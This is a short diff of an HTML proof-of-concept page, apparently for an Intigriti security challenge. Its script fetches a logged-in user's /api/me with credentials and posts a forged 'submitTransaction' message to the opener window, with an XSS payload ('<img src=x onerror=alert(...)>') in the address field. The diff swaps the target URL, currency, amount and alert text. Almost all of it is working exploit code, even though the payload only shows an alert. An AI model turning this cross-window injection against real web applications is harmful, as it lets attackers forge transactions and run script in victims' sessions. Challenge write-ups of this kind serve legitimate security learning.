@@ -6,7 +6,7 @@
   <body>
     <h1>OOO Poc OOO</h1>
     <script>
-fetch("https://challenge-0126.intigriti.io/api/me", {
+fetch("/api/me", {
     method: "GET",
     credentials: "include"
 })
@@ -26,9 +26,9 @@ fetch("https://challenge-0126.intigriti.io/api/me", {
       window.opener.postMessage({
     type: 'submitTransaction',
     transaction: {
-        currency: 'BTC',
-        amount: 100000,
-        toAddress: '<img src=x onerror=alert("0xk7edr")>'
+        currency: '1337COIN',
+        amount: 1,
+        toAddress: '<img src=x onerror=alert(1337)>'
     }
 }, '*');
 
